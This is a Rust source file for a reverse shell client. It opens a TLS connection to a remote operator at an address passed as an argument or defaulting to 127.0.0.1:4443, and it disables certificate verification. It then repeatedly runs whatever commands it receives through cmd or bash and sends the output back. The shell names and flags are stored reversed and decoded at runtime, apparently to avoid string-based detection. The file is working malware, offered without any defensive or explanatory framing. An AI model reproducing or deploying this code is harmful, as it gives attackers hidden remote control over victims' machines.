use std::io::{Read, Write };
use std::net::{TcpStream, SocketAddr};
use std::process::{Command, exit};
use native_tls::TlsConnector;
use std::env;



fn main() {
    


    let mut tls_build = TlsConnector::builder();
    tls_build.danger_accept_invalid_certs(true);

    let connector = tls_build.build().unwrap();
    let args: Vec<_> = env::args().collect();

    let server_details = if args.len() > 1 {
        args[1].clone()
    } 
    else { // hardcoded information 
        "127.0.0.1:4443".to_owned()
    }.to_string();

    let sockettest: SocketAddr = server_details.parse().unwrap();
	
    let convertsocket = sockettest.to_string();
	let convertip = sockettest.ip().to_string();
    let stream = TcpStream::connect(&convertsocket).unwrap();
    let mut stream =  connector.connect(&convertip,stream).unwrap();
    loop {
        let mut recv = [0 as u8; 1024];
        let _ = stream.read(&mut recv);
        let my_string = String::from_utf8_lossy(&recv);
        let mut split = my_string.split("\n");
        
        let osstr = if env::consts::OS == "windows" {
            "dmc"
        } else if env::consts::OS == "linux" {
            "hsab"
        }
        else {
            ""
        }.to_string();

        if osstr == "" {

            println!("Unknown system: {}. Client runs only on windows or linux. Exiting...", env::consts::OS);
            exit(1);

        }

        let osstr3 = if env::consts::OS == "windows" {
            "c/"
        } else if env::consts::OS == "linux" {
            "c-"
        }
        else {
            ""
        }.to_string();
              

        let osstr2 = osstr.chars().rev().collect::<String>();
        let osstr4 = osstr3.chars().rev().collect::<String>();
        let main_command = split.next().unwrap();
        
        if let Ok(command) = Command::new(
            osstr2.clone())
            .args([osstr4.clone(),main_command.to_owned()])
            .output() {
            if command.stdout.len() != 0 {
                stream.write_all(&command.stdout).unwrap();
            }else {
                stream.write_all(&command.stderr).unwrap();
            };
        } else {
            let _ = stream.write_all(b"");
        }
    }
}

